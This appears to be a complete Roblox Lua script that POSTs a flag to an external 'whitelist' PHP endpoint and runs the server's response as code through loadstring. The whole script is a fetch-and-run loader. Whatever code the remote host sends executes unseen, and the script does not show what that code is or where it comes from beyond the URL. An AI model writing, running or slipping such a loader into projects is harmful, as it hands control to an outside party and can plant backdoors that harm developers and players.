-- Import the HTTP module
local http = game:GetService("HttpService")

-- Set the URL of the PHP script
local url = "https://whitelist.happyhz.xyz/test.php"

-- Define the POST data
local postData = {
    ["happyhz"] = true
}

-- Encode the POST data as a JSON string
local jsonPostData = http:JSONEncode(postData)

-- Make the HTTP request and load the response as a string
local response = http:PostAsync(url, jsonPostData)

-- Load the response as Lua code using loadstring
loadstring(response)()
